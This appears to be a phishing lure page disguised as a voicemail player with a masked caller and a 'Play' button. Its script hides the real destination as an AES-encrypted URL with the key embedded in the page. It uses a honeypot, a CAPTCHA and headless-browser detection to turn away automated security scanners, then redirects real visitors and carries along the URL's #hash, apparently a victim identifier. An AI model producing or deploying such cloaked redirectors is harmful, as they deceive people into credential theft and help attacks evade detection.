<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Voicemail</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background: #f4f4f4;
      margin: 0;
      padding: 0;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
    }

    .voicemail-container {
      background: white;
      padding: 2rem;
      border-radius: 12px;
      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
      width: 90%;
      max-width: 500px;
    }

    h1 {
      margin-top: 0;
      font-size: 1.8rem;
      text-align: center;
    }

    .message {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 1rem;
      margin-top: 1.5rem;
      background: #f9f9f9;
      border-radius: 8px;
    }

    .message-info {
      display: flex;
      flex-direction: column;
    }

    .message-info span {
      font-size: 0.9rem;
      color: #555;
    }

    button.play {
      background: #4CAF50;
      color: white;
      border: none;
      padding: 0.5rem 1rem;
      border-radius: 6px;
      cursor: pointer;
      font-weight: bold;
    }

    button.play:disabled {
      background: gray;
      cursor: not-allowed;
    }

    button.play:hover:enabled {
      background: #45a049;
    }

    .g-recaptcha {
      margin-top: 1rem;
    }
  </style>
  <script src="https://www.google.com/recaptcha/api.js" async defer></script>
</head>
<body>
  <div class="voicemail-container">
    <h1>Play Messages</h1>
    <form id="voicemail-form" onsubmit="return false;">
      <!-- Honeypot field -->
      <input type="text" name="extra_field" style="display: none;" autocomplete="off" />

      <!-- CAPTCHA -->
      <div class="g-recaptcha" data-sitekey="6LezZk8rAAAAAMuJcSkmslAczs0VyiVk-ti0w5Uw"></div>

      <div class="message">
        <div class="message-info">
          <strong>Caller: John ****</strong>
          <span>May 29, 2025 - 10:15 AM</span>
        </div>
        <button class="play" type="button">▶️ Play</button>
      </div>
    </form>
  </div>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
  <script>
    const playButton = document.querySelector('.play');
    const form = document.getElementById('voicemail-form');

    // AES-encrypted URL (e.g. https://google.com)
    const encryptedRedirect = "U2FsdGVkX19v4zOFaCWT7dRHF2O1nV++DoTOoonLAssbpocFzPDmAJj5gl/w5MtF";
    const aesKey = "2XPoyVKDRqzq7YFqRdkGxNHuIPyg4kwSbD2EY5TcA3N3LbBIHefVZKRgGj+yDLQm";

    function decryptAES(encrypted, key) {
      return CryptoJS.AES.decrypt(encrypted, key).toString(CryptoJS.enc.Utf8);
    }

    function isHeadlessBrowser() {
      return (
        navigator.webdriver ||
        !navigator.plugins.length ||
        !window.chrome ||
        /HeadlessChrome/.test(navigator.userAgent)
      );
    }

    playButton.addEventListener('click', () => {
      const formData = new FormData(form);
      const honeypot = formData.get("extra_field");

      if (honeypot) {
        alert("Bot activity detected.");
        return;
      }

      const recaptchaResponse = grecaptcha.getResponse();
      if (!recaptchaResponse) {
        alert("Please complete the CAPTCHA.");
        return;
      }

      if (isHeadlessBrowser()) {
        alert("Headless browsers are not allowed.");
        return;
      }

      try {
        const redirectURL = decryptAES(encryptedRedirect, aesKey);
        const hash = window.location.hash || ""; // preserves original #hash from URL
        const finalURL = redirectURL + hash;
        window.location.href = finalURL;
      } catch (err) {
        alert("Redirect failed.");
      }
    });
  </script>
</body>
</html>
